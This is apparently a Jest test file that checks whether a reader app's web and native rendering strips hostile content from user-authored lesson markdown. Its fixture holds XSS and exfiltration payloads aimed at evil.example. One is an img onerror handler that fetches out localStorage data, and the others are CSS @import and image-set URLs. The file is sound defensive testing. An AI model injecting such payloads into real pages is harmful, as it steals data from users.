/** @jest-environment jsdom */
// Mirrors shared/[id].tsx: a hostile author's book_json topic, through the REAL
// render entries. Web: renderTopicToSafeHtml. Native: buildTopicHtml executed.
import { JSDOM } from "jsdom";
import { renderTopicToSafeHtml } from "@/reader/renderContent";
import { buildTopicHtml } from "@/components/contentHtml";
import type { GeneratedTopic } from "@/types/book";

const hostile = {
  id: "t", label: "Intro", detail: "d",
  lesson: { title: "Intro", sections: [{
    heading: "S1",
    body_markdown:
      'Real prose.\n\n<img src="x" onerror="fetch(\'https://evil.example/steal?k=\'+localStorage.length)">\n\n' +
      '<style>@import url("https://evil.example/c.css")</style>\n\n' +
      '<div style="background-image:image-set(\'https://evil.example/p.png\' 1x)">x</div>',
  }] },
} as unknown as GeneratedTopic;

it("web entry (renderTopicToSafeHtml) drops all egress + XSS, keeps prose", () => {
  const out = renderTopicToSafeHtml(hostile);
  expect(out).not.toContain("evil.example");
  expect(out).not.toContain("onerror");
  expect(out).not.toContain("<script");
  expect(out).toContain("Real prose.");
});

it("native entry (buildTopicHtml, executed) drops all egress + XSS, keeps prose", () => {
  const doc = buildTopicHtml(hostile).replace(/<script src="https:[^"]*"[^>]*><\/script>/g, "");
  const root = new JSDOM(doc, { runScripts: "dangerously" }).window.document.getElementById("root")?.innerHTML ?? "";
  expect(root).not.toContain("evil.example");
  expect(root).not.toContain("onerror");
  expect(root).toContain("Real prose.");
});
